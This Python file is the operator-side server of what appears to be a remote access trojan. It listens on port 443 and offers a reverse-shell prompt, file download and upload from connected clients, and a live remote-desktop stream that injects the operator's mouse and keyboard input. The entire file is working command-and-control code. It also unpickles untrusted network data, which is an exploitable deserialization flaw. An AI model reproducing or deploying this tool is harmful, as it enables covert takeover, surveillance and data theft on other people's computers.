import cv2
import socket
import pickle
import struct
import threading
import lzma
import os
import json

global _win32
try:
    import win32api
    _win32 = True
except:
    _win32 = False

menu = """
Commands            Description
~~~~~~~~            ~~~~~~~~~~~
!shell              Interact with the clients shell
!download           Download a file from client
!upload             Upload a file to client
!start_stream       Start a remote desktop connection
!stop_stream        Stop the remote desktop connection
"""

class RemoteDesktop:
    def __init__(self, host, port):
        self.ip = host
        self.port = port
        self.active = False
        self.reset = False
        self.revshell = True
        self.__block = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.ip, self.port))
        self.userinput = 0
        self.monitor = 0
        self.width = 0
        self.height = 0
        self.cwd = "> "
        self.display_data = {}
        self.position = 0   
        self.connected_ip = []
        self.connected_port = []
        self.stream = False
        self.killstream = False

    def start_server(self):
        if self.active:
            print("server already running")
        else:
            self.active = True
            server_thread = threading.Thread(target=self.__server_listening)
            server_thread.start()
  

    def __server_listening(self):
        self.socket.listen()
        while self.active:
            self.__block.acquire()
            connection, address = self.socket.accept()
            self.connected_ip.append(address[0])
            self.connected_port.append(address[1])
            self.__block.release()
            t = threading.Thread(target=self.__client_connection, args=(connection, address,))
            t.start()
            print("Connection started!")
    
    def stop_server(self):
        if self.active:
            self.active = False
            closing_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            closing_connection.connect((self.ip, self.port))
            closing_connection.close()
            self.__block.acquire()
            self.socket.close()
            self.__block.release()
        else:
            print("Server not running!")
            
            


    # def send(self, msg, conn):
    #     conn.send(msg)

    def send(self, msg, conn):
        conn.sendall(struct.pack('>I', len(msg)) + msg)

        
    def is_between(self, num, range1, range2):
        if range1 > range2:
            range1, range2 = range2, range1
        return range1 <= num <= range2

    def get_pos(self) -> int:
        for i in range(self.monitor - 1):
            self.position += self.display_data[i]['resolution'][0]
        return self.position
    

    def showcords(self, event,x,y,flags,param) -> None:
        conn = param
        if self.is_between(x, self.width-30, self.width-80) and self.is_between(y, 0, 50) and event == 4 and self.userinput==0:
            self.userinput=1
        elif self.is_between(x, self.width-30, self.width-80) and self.is_between(y, 0, 50) and event == 4 and self.userinput==1:
            self.userinput=0

        if self.userinput == 1:
            if _win32:
                win32api.SetCursor(win32api.LoadCursor(0, 32649))
            x = str(x + self.get_pos())
            y = str(y + int(self.display_data[self.monitor - 1]['position'][1]))
            event = str(event)
            flags = str(flags)
            data = ["mouse", x, y, event, flags]
            keys = ":".join(data)
            self.send(keys.encode('utf-8'), conn)
            self.position = 0

    def sortframe(self, frame_data):
        data = lzma.decompress(frame_data)
        frame = pickle.loads(data, fix_imports=True, encoding="bytes")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame = cv2.resize(frame, (self.width, self.height))
        return frame


    
    def fps(self, fps):
        if int(fps) < 10:
            return (fps, (0, 0, 255))
        elif int(fps) < 30:
            return (fps, (2, 186, 252))
        else:
            return (fps, (0, 255, 0))
        

    def download(self, data):
        with open(f"downloads/{self.filename}", 'wb') as _file:
            _file.write(data[10:])
            self.revshell = True
            print("DOWNLAD COMPLETE")

            
    def received(self, data, connection):
        if data.startswith(b"download->"):
            print("DONWLOADING")
            self.download(data)
        elif data.startswith(b"upload->"):
            print("UPLOADING")
            self.upload(data, connection)
        else:
            self.cwd = data.decode().split(">", 1)[0] + "> "
            print(data.decode().split(">", 1)[1])
            self.revshell = True

        
    def menu(self, connection, address):
        while self.revshell:
            try:
                shell = input(str(address[0]) + "> ")
                if shell == "cls" or shell == "clear":
                    os.system("cls")
                elif shell == "":
                    continue
                elif shell.startswith("!download"):
                    self.filename = shell.split(" ")[1]
                    self.send(b"shell:"+shell.encode('utf-8'), connection)
                elif shell.startswith("!upload"):
                    with open(shell.split(" ")[1], "rb") as _file:
                        self.send(b"shell:" + shell.encode('utf-8')+ b" " + _file.read(), connection)
                elif shell == "!start_stream":
                    self.send(b"shell:"+shell.encode('utf-8'), connection)
                    self.stream = True
                elif shell == "!stop_stream":
                    self.send(b"shell:"+shell.encode('utf-8'), connection)
                    self.stream = False
                    self.killstream = True
                elif shell == "!shell":
                    self.shell(connection)
                elif shell == "help":
                    print(menu)
                else:
                    print("Invalid command. Type help to view options")
            except EOFError:
                print()
            continue

    def shell(self, connection):
        while True:
            if self.revshell:
                try:
                    shell = input(self.cwd)
                    if shell == "exit":
                        break
                    if shell == "cls" or shell == "clear":
                        os.system("cls")
                    elif shell == "":
                        continue
                    else:
                        shell = "shell:" + shell
                        self.send(shell.encode('utf-8'), connection)
                        self.revshell = False
                except EOFError:
                    print()
                    continue

            

    def Getclientdetails(self, connection, address):
        shell_thread = threading.Thread(target=self.menu, args=(connection, address,))
        shell_thread.start()
        display = connection.recv(1028).decode()
        self.display_data = json.loads(display)
        self.width, self.height = int(self.display_data[0]['size'][0]), int(self.display_data[0]['size'][1])
        self.monitor = int(self.display_data[0]['len_monitors'])
        return self.monitor
    

    def recvall(self, max_buff, connection):
        # Helper function to recv n bytes or return None if EOF is hit
        data = bytearray()
        while len(data) < max_buff:
            packet = connection.recv(max_buff - len(data))
            if not packet:
                return None
            data.extend(packet)
        return data
    
    def recv(self, connection):
        # Read message length and unpack it into an integer
        raw_msglen = self.recvall(4, connection)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(msglen, connection)
    
    '''Sorry for the messy function'''

    def window(self, name):
        cv2.namedWindow(name, cv2.WINDOW_KEEPRATIO)
        cv2.resizeWindow(name, (960, 540))
        cv2.createTrackbar("Quality", name, 15, 100, lambda x: x)
        cv2.createTrackbar("Monitor", name, 0, self.monitor, lambda y: y)

    def display_frame(self, data_stream, connection, address):
        frame = self.sortframe(data_stream[7:])
        cv2.rectangle(frame, (self.width-30, 0), (self.width-80, 50), (136, 8, 8), 4)
        if self.userinput == 0:
            cv2.putText(frame, "Click blue box to control", (200,40), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0,0), 2)
        cv2.setMouseCallback(str(address), self.showcords, param=(connection))
        cv2.imshow(str(address), frame)
        
    def __client_connection(self, connection, address):
        self.monitor = self.Getclientdetails(connection, address)
        send = 0
        while self.active:
            data_stream = self.recv(connection)
            if self.stream:
                self.window(str(address))
                self.stream = False
            elif not self.stream and self.killstream:
                try:
                    cv2.destroyAllWindows()
                    self.killstream = False
                except: 
                    pass
            try:
                if data_stream[0:7].decode() == "video->":
                    self.display_frame(data_stream, connection, address)
                    k = cv2.waitKey(1)
                    self.monitor = cv2.getTrackbarPos("Monitor", str(address)) + 1
                    quality = "config:" + str(cv2.getTrackbarPos("Quality", str(address))) + ":" + str(self.userinput) + ":" + str(self.monitor)
                    if k != -1 and self.userinput == 1:
                        keyboard = "keyboard:" + str(k)
                        self.send(keyboard.encode('utf-8'), connection)
                    if send >= 5:
                        self.send(str(quality).encode('utf-8'), connection)
                        send = 0
                else:
                    self.received(data_stream, connection)
                send +=1
            except cv2.error:
                self.active = False
                pass
if __name__ == '__main__':
    RemoteDesktop('0.0.0.0', 443).start_server()
